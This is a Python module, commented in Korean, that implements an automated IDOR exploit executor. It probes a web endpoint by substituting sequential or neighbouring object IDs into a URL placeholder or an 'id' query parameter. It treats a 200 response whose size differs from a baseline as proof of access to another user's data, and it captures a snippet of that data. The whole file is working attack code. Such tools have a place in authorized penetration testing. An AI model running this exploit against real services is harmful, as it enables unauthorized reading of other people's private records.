"""IDOR (Insecure Direct Object Reference) 익스플로잇 executor."""
import logging
from typing import TypedDict

import httpx

logger = logging.getLogger(__name__)

# 기본 탐색 대상 ID — 실제 서비스에서 흔히 존재하는 시드값
_PROBE_IDS: tuple[int, ...] = (1, 2, 100, 999)

_TIMEOUT_SECONDS = 30

# 응답 크기 차이가 이 임계값(바이트) 이상이면 다른 데이터로 판단한다
_SIZE_DIFF_THRESHOLD = 50


class ExploitOutcome(TypedDict):
    success: bool
    payload: str
    response_snippet: str
    evidence: str
    error: str | None


def _build_probe_ids(params: dict) -> list[int]:
    """params에 user_id 힌트가 있으면 +1 탐색을 우선 배치한다."""
    ids = list(_PROBE_IDS)
    if "user_id" in params:
        try:
            own_id = int(params["user_id"])
            ids = [own_id + 1] + [i for i in ids if i != own_id + 1]
        except (ValueError, TypeError):
            pass
    return ids


async def execute(target_url: str, endpoint: str, params: dict) -> ExploitOutcome:
    """endpoint의 {id} 플레이스홀더에 순차 ID를 주입하거나 쿼리스트링 id 파라미터를 변경한다.

    응답이 200이고 기준 요청과 응답 크기 차이가 있으면 다른 사용자 데이터 접근으로 판단한다.
    기준 요청은 프로브 ID 목록 중 첫 번째 값으로 한다.
    """
    base_url = target_url.rstrip("/") + "/" + endpoint.lstrip("/")
    probe_ids = _build_probe_ids(params)
    last_error: str | None = None
    baseline_size: int | None = None

    async with httpx.AsyncClient(timeout=_TIMEOUT_SECONDS, follow_redirects=True) as client:
        for probe_id in probe_ids:
            # endpoint에 {id} 템플릿이 있으면 치환, 없으면 쿼리스트링으로 주입한다
            if "{id}" in base_url:
                url = base_url.replace("{id}", str(probe_id))
                request_params = params
            else:
                url = base_url
                request_params = {**params, "id": probe_id}

            try:
                response = await client.get(url, params=request_params)

                if baseline_size is None:
                    # 첫 번째 응답을 기준 크기로 설정한다
                    baseline_size = len(response.content)
                    continue

                if response.status_code == 200:
                    current_size = len(response.content)
                    size_diff = abs(current_size - baseline_size)

                    if size_diff >= _SIZE_DIFF_THRESHOLD:
                        snippet = response.text[:500]
                        return ExploitOutcome(
                            success=True,
                            payload=f"id={probe_id}",
                            response_snippet=snippet,
                            evidence=(
                                f"Response size differs by {size_diff} bytes from baseline "
                                f"(baseline={baseline_size}, current={current_size})"
                            ),
                            error=None,
                        )

            except httpx.HTTPError as exc:
                last_error = str(exc)
                logger.warning("[idor] request failed endpoint=%s id=%s: %s", endpoint, probe_id, exc)

    return ExploitOutcome(
        success=False,
        payload=str(probe_ids),
        response_snippet="",
        evidence="No significant response size difference detected across probe IDs",
        error=last_error,
    )
